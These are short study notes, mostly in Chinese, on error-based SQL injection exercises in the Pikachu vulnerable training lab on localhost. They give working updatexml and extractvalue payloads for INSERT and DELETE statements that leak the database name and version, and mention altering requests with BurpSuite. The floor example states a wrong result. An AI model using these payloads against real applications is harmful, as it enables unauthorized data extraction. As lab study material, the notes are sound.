用户注册
http://localhost/pikachu/vul/sqli/sqli_iu/sqli_reg.php
注册就是insert

原始sql
insert into member(username, pw,sex,phone,email,addr)
values('', '', '');

payload is
avb' or updatexml(0x7e, concat('k', database()),0) or '

基于delete
修改BurpSuite包
将参数修改为
1 or updatexml(1, concat(0x7e, database()),0)


part2
extractvalue(xml_doc, xpath)
kobe' and extractvalue(0, concat(0x7e, version()))#


part3 floor
run 
select floor(111.111)
返回
1111

